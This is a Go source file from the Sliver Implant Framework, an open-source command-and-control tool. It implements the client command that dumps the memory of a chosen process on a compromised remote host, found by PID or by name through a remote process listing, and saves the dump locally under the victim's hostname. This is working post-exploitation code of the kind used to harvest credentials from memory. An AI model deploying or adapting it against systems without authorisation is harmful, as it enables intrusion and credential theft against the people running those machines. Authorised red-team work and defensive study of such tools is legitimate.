package proc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"path"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ProcDump - Dump process memory
type ProcDump struct {
	Positional struct {
		PID int32 `description:"process ID to dump memory from"`
	} `positional-args:"yes"`
	Options struct {
		Name string `long:"name" short:"n" description:"target process name"`
	} `group:"process filters"`
}

// Execute - Dump process memory
func (p *ProcDump) Execute(args []string) (err error) {

	pid := p.Positional.PID
	name := p.Options.Name

	if pid == 0 && name != "" {
		pid = getPIDByName(name, core.ActiveTarget.Session)
	}
	if pid == -1 {
		return log.Errorf("Invalid process target")
	}

	ctrl := make(chan bool)
	go log.SpinUntil("Dumping remote process memory ...", ctrl)
	dump, err := transport.RPC.ProcessDump(context.Background(), &sliverpb.ProcessDumpReq{
		Pid:     pid,
		Timeout: int32(core.SessionRequest(core.ActiveTarget.Session).Timeout),
		Request: core.ActiveTarget.Request(),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return log.Errorf("Error: %s", err)
	}

	hostname := core.ActiveTarget.Session.Hostname
	tmpFileName := path.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
	tmpFile, err := ioutil.TempFile("", tmpFileName)
	if err != nil {
		return log.Errorf("Error creating temporary file: %v", err)
	}
	tmpFile.Write(dump.GetData())
	log.Infof("Process dump stored in: %s\n", tmpFile.Name())

	return
}

func getPIDByName(name string, sess *clientpb.Session) int32 {
	ps, err := transport.RPC.Ps(context.Background(), &sliverpb.PsReq{
		Request: core.ActiveTarget.Request(),
	})
	if err != nil {
		return -1
	}
	for _, proc := range ps.Processes {
		if proc.Executable == name {
			return proc.Pid
		}
	}
	return -1
}
